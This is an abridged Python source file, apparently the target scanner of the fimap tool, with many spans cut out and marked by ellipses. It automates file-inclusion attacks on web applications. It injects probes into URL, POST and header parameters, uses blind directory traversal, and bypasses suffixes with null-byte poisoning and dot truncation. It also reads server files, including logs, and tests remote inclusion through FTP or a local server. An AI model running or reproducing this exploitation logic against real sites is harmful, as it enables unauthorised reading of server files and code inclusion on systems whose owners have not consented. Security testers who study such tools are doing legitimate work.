...
class targetScanner (baseClass.baseClass):
    ...
    def prepareTarget(self, url):
        ...
        self._log("Inspecting URL '%s'..." %
                  (self.Target_URL), self.LOG_ALWAYS)
    ...
    def analyzeURL(self, result, k, v, post=None, haxMode=0, header=None, headerKey=None):
        ...
        if (post == None):
            ...
            self._log("Requesting: '%s' with POST('%s')..." %
                      (tmpurl, tmppost), self.LOG_DEBUG)
            code = self.doPostRequest(
                tmpurl, tmppost, additionalHeaders=headDict)
        ...
        if (code != None):
            ...
            for lang, ex in READFILE_ERR_MSG:
                ...
                if (m != None):
                    if (haxMode == 0):
                        self._log("Possible local file disclosure found! -> '%s' with Parameter '%s'. (%s)" %
                                  (tmpurl, k, lang), self.LOG_ALWAYS)
                    elif (haxMode == 1):
                        self._log("Possible local file disclosure found! -> '%s' with POST-Parameter '%s'. (%s)" %
                                  (tmpurl, k, lang), self.LOG_ALWAYS)
                    elif (haxMode == 2):
                        self._log("Possible local file disclosure found! -> '%s' with Header(%s)-Parameter '%s'. (%s)" %
                                  (tmpurl, k, headerKey, lang), self.LOG_ALWAYS)
            ...
            if (not disclosure_found):
                ...
                for lang, sniper in sniper_regex:
                    ...
                    if (m != None):
                        rep = None
                        self._writeToLog("POSSIBLE ; %s ; %s" %
                                         (self.Target_URL, k))
                        if (haxMode == 0):
                            self._log("[%s] Possible file inclusion found! -> '%s' with Parameter '%s'." % (
                                lang, tmpurl, k), self.LOG_ALWAYS)
                            rep = self.identifyVuln(
                                self.Target_URL, self.params, k, post, lang, haxMode, None, None, headerKey, headerDict=headDict)
                        elif (haxMode == 1):
                            self._log("[%s] Possible file inclusion found! -> '%s' with POST-Parameter '%s'." % (
                                lang, tmpurl, k), self.LOG_ALWAYS)
                            rep = self.identifyVuln(
                                self.Target_URL, self.postparams, k, post, lang, haxMode, None, None, headerKey, headerDict=headDict)
                        elif (haxMode == 2):
                            self._log("[%s] Possible file inclusion found! -> '%s' with Header(%s)-Parameter '%s'." % (
                                lang, tmpurl, headerKey, k), self.LOG_ALWAYS)
                            rep = self.identifyVuln(
                                self.Target_URL, self.header, k, post, lang, haxMode, None, None, headerKey, headerDict=headDict)
    ...
    def analyzeURLblindly(self, i, testfile, k, v, find, goBackSymbols, post=None, haxMode=0, isUnix=True, header=None, headerKey=None):
        ...
        if (code != None):
            if (code.find(find) != -1):
                if (haxMode == 0):
                    self._log("Possible file inclusion found blindly! -> '%s' with Parameter '%s'." %
                              (tmpurl, k), self.LOG_ALWAYS)
                    rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, haxMode, (
                        goBackSymbols * i, False), isUnix, headerDict=headDict)

                elif (haxMode == 1):
                    self._log("Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." %
                              (tmpurl, k), self.LOG_ALWAYS)
                    rep = self.identifyVuln(self.Target_URL, self.postparams, k, post, None, haxMode, (
                        goBackSymbols * i, False), isUnix, headerDict=headDict)

                elif (haxMode == 2):
                    self._log("Possible file inclusion found blindly! -> '%s' with Header(%s)-Parameter '%s'." %
                              (tmpurl, headerKey, k), self.LOG_ALWAYS)
                    rep = self.identifyVuln(self.Target_URL, self.header, k, post, None, haxMode, (
                        goBackSymbols * i, False), isUnix, headerKey, headerDict=headDict)
                ...
                if (post != None and post != ""):
                    ...
                    self._log("Requesting: '%s' with POST('%s')..." %
                              (tmpurl, postdata), self.LOG_DEBUG)

                code = self.doPostRequest(
                    tmpurl, postdata, additionalHeaders=headDict)

                if (code == None):
                    self._log(
                        "Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
                    # User decided to skip blind check if server returned an error.
                    if (self.config["p_skiponerror"] == True):
                        self._log(
                            "You decided to cancel blind checks when the server returned an error.", self.LOG_ALWAYS)
                        self._log(
                            "Code == None. Skipping testing of the URL.", self.LOG_DEBUG)
                    ...
                    if (code.find(find) != -1):
                        if (haxMode == 0):
                            self._log(
                                "Possible file inclusion found blindly! -> '%s' with Parameter '%s'." % (tmpurl, k), self.LOG_ALWAYS)
                            doBreak = True
                        elif (haxMode == 1):
                            self._log(
                                "Possible file inclusion found blindly! -> '%s' with POST-Parameter '%s'." % (tmpurl, k), self.LOG_ALWAYS)
                            doBreak = True
                        elif (haxMode == 2):
                            self._log("Possible file inclusion found blindly! -> '%s' with Header(%s)-Parameter '%s'." % (
                                tmpurl, headerKey, k), self.LOG_ALWAYS)
                            doBreak = True
                        rep = self.identifyVuln(self.Target_URL, self.params, k, post, None, haxMode, (
                            goBackSymbols * i, True), isUnix, headerKey, headerDict=headDict)
    ...
    def testTargetVuln(self):
        ...
        for k, v in list(self.params.items()):
            self.analyzeURL(
                ret, k, v, self.config["p_post"], 0, self.config["header"])
        # Scan Post
        for k, v in list(self.postparams.items()):
            self.analyzeURL(
                ret, k, v, self.config["p_post"], 1, self.config["header"])
        # Scan Headers
        for key, params in list(self.header.items()):
            for k, v in list(params.items()):
                self.analyzeURL(ret, k, v, self.config["p_post"], 2, deepcopy(
                    self.config["header"]), key)
        ...
        if (len(ret) == 0 and self.MonkeyTechnique):
            ...
            for fileobj in files:
                ...
                backSyms = (fileobj.getBackSymbols(),
                            fileobj.getBackSymbols(False))
                ...
                for backSym in backSyms:
                    ...
                    if (self.config["p_multiply_term"] > 1):
                        ...
                        backSym = backSym.replace(
                            fileobj.getBackSymbol(), fileobj.getBackSymbol() * multi)
                    ...
                    for i in range(xml2config.getBlindMin(), xml2config.getBlindMax()):
                        ...
                        if not get_done:
                            for k, V in list(self.params.items()):
                                rep, doBreak = self.analyzeURLblindly(
                                    i, testfile, k, V, v, backSym, self.config["p_post"], 0, fileobj.isUnix(), deepcopy(self.config["header"]))
                                if (rep != None):
                                    rep.setVulnKeyVal(V)
                        ...
                        if not post_done:
                            for k, V in list(self.postparams.items()):
                                rep, doBreak = self.analyzeURLblindly(
                                    i, testfile, k, V, v, backSym, self.config["p_post"], 1, fileobj.isUnix(), deepcopy(self.config["header"]))
                                if (rep != None):
                                    rep.setVulnKeyVal(V)
                                    rep.setPostData(self.config["p_post"])
                                    rep.setPost(1)
                        ...
                        for key, params in list(self.header.items()):
                            ...
                            if (not head_done[key]):
                                for k, val in list(params.items()):
                                    rep, doBreak = self.analyzeURLblindly(
                                        i, testfile, k, val, v, backSym, self.config["p_post"], 2, fileobj.isUnix(), deepcopy(self.config["header"]), key)
                                    if (rep != None):
                        ...
                        if (doBreak):
                            # <-- Return if we found one blindly readable file.
                            return(ret)
    ...
    def identifyVuln(self, URL, Params, VulnParam, PostData, Language, haxMode=0, blindmode=None, isUnix=None, headerKey=None, headerDict=None):
        ...
        if (blindmode == None):
            ...
            if (haxMode == 0):
                self._log("[%s] Identifying Vulnerability '%s' with Parameter '%s'..." % (
                    Language, URL, VulnParam), self.LOG_ALWAYS)
            elif (haxMode == 1):
                self._log("[%s] Identifying Vulnerability '%s' with POST-Parameter '%s'..." %
                          (Language, URL, VulnParam), self.LOG_ALWAYS)
            elif (haxMode == 2):
                self._log("[%s] Identifying Vulnerability '%s' with Header(%s)-Parameter '%s'..." %
                          (Language, URL, headerKey, VulnParam), self.LOG_ALWAYS)
            ...
            if (haxMode == 0):
                tmpurl = tmpurl.replace("%s=%s" % (
                    VulnParam, Params[VulnParam]), "%s=%s" % (VulnParam, rndStr))
            elif (haxMode == 1):
                PostHax = PostHax.replace("%s=%s" % (
                    VulnParam, Params[VulnParam]), "%s=%s" % (VulnParam, rndStr))
            elif (haxMode == 2):
                tmphead = deepcopy(self.config["header"][headerKey])
                tmphead = tmphead.replace("%s=%s" % (
                    VulnParam, Params[headerKey][VulnParam]), "%s=%s" % (VulnParam, rndStr))
                headerDict[headerKey] = tmphead
                r.setVulnHeaderKey(headerKey)

            RE_SUCCESS_MSG = re.compile(
                langClass.getSniper() % (rndStr), re.DOTALL)

            code = self.doPostRequest(
                tmpurl, PostHax, additionalHeaders=headerDict)
            if (code == None):
                self._log(
                    "Identification of vulnerability failed. (code == None)", self.LOG_ERROR)
                return None

            m = RE_SUCCESS_MSG.search(code)
            if (m == None):
                self._log(
                    "Identification of vulnerability failed. (m == None)", self.LOG_ERROR)
                return None
            ...
            if (s == None):
                ...
                a = input(
                    "Do you want to help me and send the URL of the site? [y = Print Info/N = Discard]")
                if (a == "y" or a == "Y"):
                ...
                # Windows detection quick hack
                if (script != None and script[1] == ":"):
                    ...
                    if (scriptpath == None or scriptpath == ""):
                        self._log(
                            "Scriptpath is empty! Assuming that we are on toplevel.", self.LOG_WARN)
                        scriptpath = "/"
                        script = "/" + script

                # Check if scriptpath was received correctly.
                if(scriptpath != ""):
                    self._log("Scriptpath received: '%s'" %
                              (scriptpath), self.LOG_INFO)
            ...
            if (errmsg == rndStr):
                ...
                if (pre[0] != "/"):
                    if (r.isUnix()):
                        ...
                        if (pre[1] == ":"):
                            ...
                            self._log(
                                "The inclusion points to a network path! Skipping vulnerability.", self.LOG_WARN)
                            return(None)
                ...
                if (sur != ""):
                    self._log(
                        "Trying NULL-Byte Poisoning to get rid of the suffix...", self.LOG_INFO)
                    tmpurl = URL
                    PostHax = PostData
                    ...
                    if (haxMode == 0):
                        tmpurl = tmpurl.replace("%s=%s" % (
                            VulnParam, Params[VulnParam]), "%s=%s%%00" % (VulnParam, rndStr))
                    elif (haxMode == 1):
                        PostHax = PostData.replace("%s=%s" % (
                            VulnParam, Params[VulnParam]), "%s=%s%%00" % (VulnParam, rndStr))
                    elif (haxMode == 2):
                        tmphead = deepcopy(self.config["header"][headerKey])
                        tmphead = tmphead.replace("%s=%s" % (
                            VulnParam, Params[headerKey][VulnParam]), "%s=%s%%00" % (VulnParam, rndStr))
                        head[headerKey] = tmphead
                        r.setVulnHeaderKey(headerKey)

                    code = self.doPostRequest(
                        tmpurl, PostHax, additionalHeaders=head)
                    if (code == None):
                        ...
                        self._log(
                            "NULL-Byte Poisoning not possible.", self.LOG_INFO)
                        r.setSuffixBreakable(False)
                    else:
                        self._log("NULL-Byte Poisoning successfull!",
                                  self.LOG_INFO)
                        r.setSurfix("%00")
                ...
                if (sur != "" and not r.isSuffixBreakable() and self.config["p_doDotTruncation"]):
                    if (r.isUnix() and self.config["p_dot_trunc_only_win"]):
                        self._log(
                            "Not trying dot-truncation because it's a unix server and you have not enabled it.", self.LOG_INFO)
                    else:
                        self._log(
                            "Trying Dot Truncation to get rid of the suffix...", self.LOG_INFO)
                        ...
                        self._log("Preparing Dot Truncation...",
                                  self.LOG_DEBUG)
                        self._log("Start: %d" %
                                  (dot_trunc_start), self.LOG_DEVEL)
                        self._log("Stop : %d" %
                                  (dot_trunc_end), self.LOG_DEVEL)
                        self._log("Step : %d" %
                                  (dot_trunc_step), self.LOG_DEVEL)
                        ...
                        code1 = self.doPostRequest(
                            URL, PostData, additionalHeaders=head)

                        vulnParamBlock = None

                        if (haxMode in (0, 1)):
                            vulnParamBlock = "%s=%s%s" % (
                                VulnParam, Params[VulnParam], r.getAppendix())
                        else:
                            vulnParamBlock = "%s=%s%s" % (
                                VulnParam, Params[headerKey][VulnParam], r.getAppendix())

                        if (haxMode == 0):
                            desturl = desturl.replace("%s=%s" % (
                                VulnParam, Params[VulnParam]), vulnParamBlock)
                        elif (haxMode == 1):
                            PostHax = PostHax.replace("%s=%s" % (
                                VulnParam, Params[VulnParam]), vulnParamBlock)
                        elif (haxMode == 2):
                            tmphead = deepcopy(
                                self.config["header"][headerKey])
                            tmphead = tmphead.replace("%s=%s" % (
                                VulnParam, Params[headerKey][VulnParam]), vulnParamBlock)
                            headerDict[headerKey] = tmphead
                            r.setVulnHeaderKey(headerKey)

                        self._log("Test URL will be: " +
                                  desturl, self.LOG_DEBUG)
                        ...
                        for i in range(dot_trunc_start, dot_trunc_end, dot_trunc_step):
                            ...
                            if (haxMode == 0):
                                tmpurl = tmpurl.replace(
                                    vulnParamBlock, "%s%s" % (vulnParamBlock, "." * i))
                            elif (haxMode == 1):
                                tmppost = tmppost.replace(
                                    vulnParamBlock, "%s%s" % (vulnParamBlock, "." * i))
                            elif (haxMode == 2):
                                tmp = tmphead[headerKey]
                                tmp = tmp.replace(vulnParamBlock, "%s%s" % (
                                    vulnParamBlock, "." * i))
                                tmphead[headerKey] = tmp

                            content = self.doPostRequest(
                                tmpurl, tmppost, additionalHeaders=tmphead)
                            if (content == None):
                                self._log(
                                    "Dot Truncation testing failed :(", self.LOG_WARN)
                                break

                            seqmatcher.set_seqs(code1, content)
                            ratio = seqmatcher.ratio()
                            if (1-max_diff <= ratio <= 1):
                                self._log("Dot Truncation successfull with: %d dots ; %f ratio!" % (
                                    i, ratio), self.LOG_INFO)
                                r.setSurfix("." * i)
                                r.setSuffixBreakable(True)
                                ...
                                self._log("No luck with (%s)..." %
                                          (i), self.LOG_DEBUG)
                        if (not success):
                            self._log(
                                "Dot Truncation not possible :(", self.LOG_INFO)

            if (scriptpath == ""):
                # Failed to get scriptpath with easy method :(
                if (pre != ""):
                    self._log(
                        "Failed to retrieve path but we are forced to go relative!", self.LOG_WARN)
                    self._log(
                        "Go and try it to scan with --enable-blind.", self.LOG_WARN)
                    return(None)
                else:
                    self._log(
                        "Failed to retrieve path! It's an absolute injection so I'll fake it to '/'...", self.LOG_WARN)
                    scriptpath = "/"
                    r.setServerPath(scriptpath)
                    r.setServerScript(script)
            ...
            prefix = blindmode[0]
            isNull = blindmode[1]
            self._log("Identifying Vulnerability '%s' with Parameter '%s' blindly..." % (
                URL, VulnParam), self.LOG_ALWAYS)
            r = report(URL, Params, VulnParam)
    ...
    def readFiles(self, rep):
        ...
        if rep.isLanguageSet():
            ...
            if (self.config["p_autolang"]):
                ...
                if (rep.autoDetectLanguageByExtention(xml2config.getAllLangSets())):
                    self._log("Autodetect thinks this could be a %s-Script..." %
                              (rep.getLanguage()), self.LOG_INFO)
                    self._log(
                        "If you think this is wrong start fimap with --no-auto-detect", self.LOG_INFO)
                    langClass = xml2config.getAllLangSets()[rep.getLanguage()]
                else:
                    self._log("Autodetect failed!", self.LOG_ERROR)
                    self._log(
                        "Start fimap with --no-auto-detect if you know which language it is.", self.LOG_ERROR)
                    return([])
            else:
                self._log(
                    "Unknown language! You have told me to let you choose - here we go.", self.LOG_WARN)
        ...
        for fileobj in files:
            ...
            if ((rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()))):
                if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                    ...
                    self._log(
                        "Skipping file '%s' because it's not suitable for our OS." % f, self.LOG_DEBUG)
            else:
        ...
        for fileobj in abs_files:
            ...
            if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or canbreak)):
                ...
                if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                    ...
                    self._log(
                        "Skipping absolute file '%s' because it's not suitable for our OS." % f, self.LOG_DEBUG)
            else:
        ...
        for fileobj in log_files:
            ...
            if ((rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()))):
                if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                    ...
                    self._log(
                        "Skipping log file '%s' because it's not suitable for our OS." % f, self.LOG_DEBUG)
            else:
        ...
        if (rfi_mode in ("ftp", "local")):
            if (rfi_mode == "ftp"):
                self._log(
                    "Testing remote inclusion dynamicly with FTP...", self.LOG_INFO)
            if (rfi_mode == "local"):
                self._log(
                    "Testing remote inclusion dynamicly with local server...", self.LOG_INFO)
            if (rep.getPrefix() == ""):
                fl = up = None
                quiz, answer = langClass.generateQuiz()
                if (rfi_mode == "ftp"):
                    fl = settings["dynamic_rfi"]["ftp"]["ftp_path"] + \
                        rep.getAppendix()
            ...
            for fileobj in rmt_files:
                ...
                if (rep.getPrefix() == "" and(rep.getSurfix() == "" or rep.isSuffixBreakable() or f.endswith(rep.getSurfix()) or canbreak)):
                    ...
                    if (rep.isUnix() and fileobj.isUnix() or rep.isWindows() and fileobj.isWindows()):
                        ...
                        self._log(
                            "Skipping remote file '%s' because it's not suitable for our OS." % f, self.LOG_DEBUG)
                else:
    ...
    def readFile(self, report, filepath, filepattern, isAbs=False, POST=None, HEADER=None):
        ...
        if (haxMode == 0):
            tmpurl = tmpurl.replace("%s=%s" % (
                vuln, params[vuln]), "%s=%s" % (vuln, payload))
        elif (haxMode == 1):
            postdata = postdata.replace("%s=%s" % (
                vuln, params[vuln]), "%s=%s" % (vuln, payload))
        elif (haxMode == 2):
            tmphead = header[vulnHeader]
            tmphead = tmphead.replace("%s=%s" % (
                vuln, self.header[vulnHeader][vuln]), "%s=%s" % (vuln, payload))
            header[vulnHeader] = tmphead

        self._log("Testing URL: " + tmpurl, self.LOG_DEBUG)

        RE_SUCCESS_MSG = re.compile(
            langClass.getSniper() % (filepath), re.DOTALL)
        code = None
